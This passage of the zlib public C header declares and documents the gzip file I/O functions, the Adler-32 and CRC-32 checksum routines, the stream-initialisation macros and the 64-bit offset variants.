   output buffer size of pushed characters is allowed.  (See gzbuffer above.)
   The pushed character will be discarded if the stream is repositioned with
   gzseek() or gzrewind().
*/

ZEXTERN int ZEXPORT gzflush OF((gzFile file, int flush));
/*
     Flushes all pending output into the compressed file.  The parameter flush
   is as in the deflate() function.  The return value is the zlib error number
   (see function gzerror below).  gzflush is only permitted when writing.

     If the flush parameter is Z_FINISH, the remaining data is written and the
   gzip stream is completed in the output.  If gzwrite() is called again, a new
   gzip stream will be started in the output.  gzread() is able to read such
   concatenated gzip streams.

     gzflush should be called only when strictly necessary because it will
   degrade compression if called too often.
*/

/*
ZEXTERN z_off_t ZEXPORT gzseek OF((gzFile file,
                                   z_off_t offset, int whence));

     Sets the starting position for the next gzread or gzwrite on the given
   compressed file.  The offset represents a number of bytes in the
   uncompressed data stream.  The whence parameter is defined as in lseek(2);
   the value SEEK_END is not supported.

     If the file is opened for reading, this function is emulated but can be
   extremely slow.  If the file is opened for writing, only forward seeks are
   supported; gzseek then compresses a sequence of zeroes up to the new
   starting position.

     gzseek returns the resulting offset location as measured in bytes from
   the beginning of the uncompressed stream, or -1 in case of error, in
   particular if the file is opened for writing and the new starting position
   would be before the current position.
*/

ZEXTERN int ZEXPORT    gzrewind OF((gzFile file));
/*
     Rewinds the given file. This function is supported only for reading.

     gzrewind(file) is equivalent to (int)gzseek(file, 0L, SEEK_SET)
*/

/*
ZEXTERN z_off_t ZEXPORT    gztell OF((gzFile file));

     Returns the starting position for the next gzread or gzwrite on the given
   compressed file.  This position represents a number of bytes in the
   uncompressed data stream, and is zero when starting, even if appending or
   reading a gzip stream from the middle of a file using gzdopen().

     gztell(file) is equivalent to gzseek(file, 0L, SEEK_CUR)
*/

/*
ZEXTERN z_off_t ZEXPORT gzoffset OF((gzFile file));

     Returns the current offset in the file being read or written.  This offset
   includes the count of bytes that precede the gzip stream, for example when
   appending or when using gzdopen() for reading.  When reading, the offset
   does not include as yet unused buffered input.  This information can be used
   for a progress indicator.  On error, gzoffset() returns -1.
*/

ZEXTERN int ZEXPORT gzeof OF((gzFile file));
/*
     Returns true (1) if the end-of-file indicator has been set while reading,
   false (0) otherwise.  Note that the end-of-file indicator is set only if the
   read tried to go past the end of the input, but came up short.  Therefore,
   just like feof(), gzeof() may return false even if there is no more data to
   read, in the event that the last read request was for the exact number of
   bytes remaining in the input file.  This will happen if the input file size
   is an exact multiple of the buffer size.

     If gzeof() returns true, then the read functions will return no more data,
   unless the end-of-file indicator is reset by gzclearerr() and the input file
   has grown since the previous end of file was detected.
*/

ZEXTERN int ZEXPORT gzdirect OF((gzFile file));
/*
     Returns true (1) if file is being copied directly while reading, or false
   (0) if file is a gzip stream being decompressed.

     If the input file is empty, gzdirect() will return true, since the input
   does not contain a gzip stream.

     If gzdirect() is used immediately after gzopen() or gzdopen() it will
   cause buffers to be allocated to allow reading the file to determine if it
   is a gzip file.  Therefore if gzbuffer() is used, it should be called before
   gzdirect().

     When writing, gzdirect() returns true (1) if transparent writing was
   requested ("wT" for the gzopen() mode), or false (0) otherwise.  (Note:
   gzdirect() is not needed when writing.  Transparent writing must be
   explicitly requested, so the application already knows the answer.  When
   linking statically, using gzdirect() will include all of the zlib code for
   gzip file reading and decompression, which may not be desired.)
*/

ZEXTERN int ZEXPORT    gzclose OF((gzFile file));
/*
     Flushes all pending output if necessary, closes the compressed file and
   deallocates the (de)compression state.  Note that once file is closed, you
   cannot call gzerror with file, since its structures have been deallocated.
   gzclose must not be called more than once on the same file, just as free
   must not be called more than once on the same allocation.

     gzclose will return Z_STREAM_ERROR if file is not valid, Z_ERRNO on a
   file operation error, Z_MEM_ERROR if out of memory, Z_BUF_ERROR if the
   last read ended in the middle of a gzip stream, or Z_OK on success.
*/

ZEXTERN int ZEXPORT gzclose_r OF((gzFile file));
ZEXTERN int ZEXPORT gzclose_w OF((gzFile file));
/*
     Same as gzclose(), but gzclose_r() is only for use when reading, and
   gzclose_w() is only for use when writing or appending.  The advantage to
   using these instead of gzclose() is that they avoid linking in zlib
   compression or decompression code that is not used when only reading or only
   writing respectively.  If gzclose() is used, then both compression and
   decompression code will be included the application when linking to a static
   zlib library.
*/

ZEXTERN const char * ZEXPORT gzerror OF((gzFile file, int *errnum));
/*
     Returns the error message for the last error which occurred on the given
   compressed file.  errnum is set to zlib error number.  If an error occurred
   in the file system and not in the compression library, errnum is set to
   Z_ERRNO and the application may consult errno to get the exact error code.

     The application must not modify the returned string.  Future calls to
   this function may invalidate the previously returned string.  If file is
   closed, then the string previously returned by gzerror will no longer be
   available.

     gzerror() should be used to distinguish errors from end-of-file for those
   functions above that do not distinguish those cases in their return values.
*/

ZEXTERN void ZEXPORT gzclearerr OF((gzFile file));
/*
     Clears the error and end-of-file flags for file.  This is analogous to the
   clearerr() function in stdio.  This is useful for continuing to read a gzip
   file that is being written concurrently.
*/

#endif /* !Z_SOLO */

                        /* checksum functions */

/*
     These functions are not related to compression but are exported
   anyway because they might be useful in applications using the compression
   library.
*/

ZEXTERN uLong ZEXPORT adler32 OF((uLong adler, const Bytef *buf, uInt len));
/*
     Update a running Adler-32 checksum with the bytes buf[0..len-1] and
   return the updated checksum.  If buf is Z_NULL, this function returns the
   required initial value for the checksum.

     An Adler-32 checksum is almost as reliable as a CRC-32 but can be computed
   much faster.

   Usage example:

     uLong adler = adler32(0L, Z_NULL, 0);

     while (read_buffer(buffer, length) != EOF) {
       adler = adler32(adler, buffer, length);
     }
     if (adler != original_adler) error();
*/

ZEXTERN uLong ZEXPORT adler32_z OF((uLong adler, const Bytef *buf,
                                    z_size_t len));
/*
     Same as adler32(), but with a size_t length.
*/

/*
ZEXTERN uLong ZEXPORT adler32_combine OF((uLong adler1, uLong adler2,
                                          z_off_t len2));

     Combine two Adler-32 checksums into one.  For two sequences of bytes, seq1
   and seq2 with lengths len1 and len2, Adler-32 checksums were calculated for
   each, adler1 and adler2.  adler32_combine() returns the Adler-32 checksum of
   seq1 and seq2 concatenated, requiring only adler1, adler2, and len2.  Note
   that the z_off_t type (like off_t) is a signed integer.  If len2 is
   negative, the result has no meaning or utility.
*/

ZEXTERN uLong ZEXPORT crc32   OF((uLong crc, const Bytef *buf, uInt len));
/*
     Update a running CRC-32 with the bytes buf[0..len-1] and return the
   updated CRC-32.  If buf is Z_NULL, this function returns the required
   initial value for the crc.  Pre- and post-conditioning (one's complement) is
   performed within this function so it shouldn't be done by the application.

   Usage example:

     uLong crc = crc32(0L, Z_NULL, 0);

     while (read_buffer(buffer, length) != EOF) {
       crc = crc32(crc, buffer, length);
     }
     if (crc != original_crc) error();
*/

ZEXTERN uLong ZEXPORT crc32_z OF((uLong adler, const Bytef *buf,
                                  z_size_t len));
/*
     Same as crc32(), but with a size_t length.
*/

/*
ZEXTERN uLong ZEXPORT crc32_combine OF((uLong crc1, uLong crc2, z_off_t len2));

     Combine two CRC-32 check values into one.  For two sequences of bytes,
   seq1 and seq2 with lengths len1 and len2, CRC-32 check values were
   calculated for each, crc1 and crc2.  crc32_combine() returns the CRC-32
   check value of seq1 and seq2 concatenated, requiring only crc1, crc2, and
   len2.
*/


                        /* various hacks, don't look :) */

/* deflateInit and inflateInit are macros to allow checking the zlib version
 * and the compiler's view of z_stream:
 */
ZEXTERN int ZEXPORT deflateInit_ OF((z_streamp strm, int level,
                                     const char *version, int stream_size));
ZEXTERN int ZEXPORT inflateInit_ OF((z_streamp strm,
                                     const char *version, int stream_size));
ZEXTERN int ZEXPORT deflateInit2_ OF((z_streamp strm, int  level, int  method,
                                      int windowBits, int memLevel,
                                      int strategy, const char *version,
                                      int stream_size));
ZEXTERN int ZEXPORT inflateInit2_ OF((z_streamp strm, int  windowBits,
                                      const char *version, int stream_size));
ZEXTERN int ZEXPORT inflateBackInit_ OF((z_streamp strm, int windowBits,
                                         unsigned char FAR *window,
                                         const char *version,
                                         int stream_size));
#ifdef Z_PREFIX_SET
#  define z_deflateInit(strm, level) \
          deflateInit_((strm), (level), ZLIB_VERSION, (int)sizeof(z_stream))
#  define z_inflateInit(strm) \
          inflateInit_((strm), ZLIB_VERSION, (int)sizeof(z_stream))
#  define z_deflateInit2(strm, level, method, windowBits, memLevel, strategy) \
          deflateInit2_((strm),(level),(method),(windowBits),(memLevel),\
                        (strategy), ZLIB_VERSION, (int)sizeof(z_stream))
#  define z_inflateInit2(strm, windowBits) \
          inflateInit2_((strm), (windowBits), ZLIB_VERSION, \
                        (int)sizeof(z_stream))
#  define z_inflateBackInit(strm, windowBits, window) \
          inflateBackInit_((strm), (windowBits), (window), \
                           ZLIB_VERSION, (int)sizeof(z_stream))
#else
#  define deflateInit(strm, level) \
          deflateInit_((strm), (level), ZLIB_VERSION, (int)sizeof(z_stream))
#  define inflateInit(strm) \
          inflateInit_((strm), ZLIB_VERSION, (int)sizeof(z_stream))
#  define deflateInit2(strm, level, method, windowBits, memLevel, strategy) \
          deflateInit2_((strm),(level),(method),(windowBits),(memLevel),\
                        (strategy), ZLIB_VERSION, (int)sizeof(z_stream))
#  define inflateInit2(strm, windowBits) \
          inflateInit2_((strm), (windowBits), ZLIB_VERSION, \
                        (int)sizeof(z_stream))
#  define inflateBackInit(strm, windowBits, window) \
          inflateBackInit_((strm), (windowBits), (window), \
                           ZLIB_VERSION, (int)sizeof(z_stream))
#endif

#ifndef Z_SOLO

/* gzgetc() macro and its supporting function and exposed data structure.  Note
 * that the real internal state is much larger than the exposed structure.
 * This abbreviated structure exposes just enough for the gzgetc() macro.  The
 * user should not mess with these exposed elements, since their names or
 * behavior could change in the future, perhaps even capriciously.  They can
 * only be used by the gzgetc() macro.  You have been warned.
 */
struct gzFile_s {
    unsigned have;
    unsigned char *next;
    z_off64_t pos;
};
ZEXTERN int ZEXPORT gzgetc_ OF((gzFile file));  /* backward compatibility */
#ifdef Z_PREFIX_SET
#  undef z_gzgetc
#  define z_gzgetc(g) \
          ((g)->have ? ((g)->have--, (g)->pos++, *((g)->next)++) : (gzgetc)(g))
#else
#  define gzgetc(g) \
          ((g)->have ? ((g)->have--, (g)->pos++, *((g)->next)++) : (gzgetc)(g))
#endif

/* provide 64-bit offset functions if _LARGEFILE64_SOURCE defined, and/or
 * change the regular functions to 64 bits if _FILE_OFFSET_BITS is 64 (if
 * both are true, the application gets the *64 functions, and the regular
 * functions are changed to 64 bits) -- in case these are set on systems
 * without large file support, _LFS64_LARGEFILE must also be true
 */
#ifdef Z_LARGE64
   ZEXTERN gzFile ZEXPORT gzopen64 OF((const char *, const char *));
   ZEXTERN z_off64_t ZEXPORT gzseek64 OF((gzFile, z_off64_t, int));
   ZEXTERN z_off64_t ZEXPORT gztell64 OF((gzFile));
   ZEXTERN z_off64_t ZEXPORT gzoffset64 OF((gzFile));
   ZEXTERN uLong ZEXPORT adler32_combine64 OF((uLong, uLong, z_off64_t));
   ZEXTERN uLong ZEXPORT crc32_combine64 OF((uLong, uLong, z_off64_t));
#endif

#if !defined(ZLIB_INTERNAL) && defined(Z_WANT64)
#  ifdef Z_PREFIX_SET
#    define z_gzopen z_gzopen64
#    define z_gzseek z_gzseek64
#    define z_gztell z_gztell64
#    define z_gzoffset z_gzoffset64
#    define z_adler32_combine z_adler32_combine64
#    define z_crc32_combine z_crc32_combine64
#  else
#    define gzopen gzopen64
#    define gzseek gzseek64
#    define gztell gztell64
#    define gzoffset gzoffset64
#    define adler32_combine adler32_combine64
#    define crc32_combine crc32_combine64
#  endif
#  ifndef Z_LARGE64
     ZEXTERN gzFile ZEXPORT gzopen64 OF((const char *, const char *));
     ZEXTERN z_off_t ZEXPORT gzseek64 OF((gzFile, z_off_t, int));
     ZEXTERN z_off_t ZEXPORT gztell64 OF((gzFile));
     ZEXTERN z_off_t ZEXPORT gzoffset64 OF((gzFile));
     ZEXTERN uLong ZEXPORT adler32_combine64 OF((uLong, uLong, z_off_t));
     ZEXTERN uLong ZEXPORT crc32_combine64 OF((uLong, uLong, z_off_t));
#  endif
#else
   ZEXTERN gzFile ZEXPORT gzopen OF((const char *, const char *));
   ZEXTERN z_off_t ZEXPORT gzseek OF((gzFile, z_off_t, int));
   ZEXTERN z_off_t ZEXPORT gztell OF((gzFile));
   ZEXTERN z_off_t ZEXPORT gzoffset OF((gzFile));
   ZEXTERN uLong ZEXPORT adler32_combine OF((uLong, uLong, z_off_t));
   ZEXTERN uLong ZEXPORT crc32_combine OF((uLong, uLong, z_off_t));
#endif

#else /* Z_SOLO */

   ZEXTERN uLong ZEXPORT adler32_combine OF((uLong, uLong, z_off_t));
   ZEXTERN uLong ZEXPORT crc32_combine OF((uLong, uLong, z_off_t));

#endif /* !Z_SOLO */

/* undocumented functions */
ZEXTERN const char   * ZEXPORT zError           OF((int));
ZEXTERN int            ZEXPORT inflateSyncPoint OF((z_streamp));
ZEXTERN const z_crc_t FAR * ZEXPORT get_crc_table    OF((void));
ZEXTERN int            ZEXPORT inflateUndermine OF((z_streamp, int));
ZEXTERN int            ZEXPORT inflateValidate OF((z_streamp, int));
ZEXTERN unsigned long  ZEXPORT inflateCodesUsed OF ((z_streamp));
ZEXTERN int            ZEXPORT inflateResetKeep OF((z_streamp));
ZEXTERN int            ZEXPORT deflateResetKeep OF((z_streamp));
#if (defined(_WIN32) || defined(__CYGWIN__)) && !defined(Z_SOLO)
ZEXTERN gzFile         ZEXPORT gzopen_w OF((const wchar_t *path,
                                            const char *mode));
#endif
#if defined(STDC) || defined(Z_HAVE_STDARG_H)
#  ifndef Z_SOLO
ZEXTERN int            ZEXPORTVA gzvprintf Z_ARG((gzFile file,
                                                  const char *format,
                                                  va_list va));
#  endif
#endif

#ifdef __cplusplus
}
#endif

#endif /* ZLIB_H */

```